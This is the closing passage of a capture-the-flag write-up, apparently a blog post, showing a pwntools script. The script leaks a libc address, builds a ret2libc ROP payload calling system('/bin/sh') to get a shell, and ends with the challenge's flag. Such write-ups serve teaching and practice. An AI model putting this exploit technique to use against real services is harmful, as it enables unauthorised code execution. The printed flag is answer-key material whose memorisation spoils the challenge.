    leak = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = leak - libc.sym['puts']

    sh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']
    ret = exe.address + 0x000000000000101a # ret

    payload = flat({
        offset: [
            pop_rdi,
            sh,
            b'A'*8,
            system
        ]
    })

    io.sendline('pwner')
    io.sendline(payload)

    io.interactive()


def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()
```

Running it works!
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/049fa43f-c064-426c-bc10-ab788106f49a)

```
Flag: jctf{Return_to_Sender}
```

That's all....thanks for reading 😜
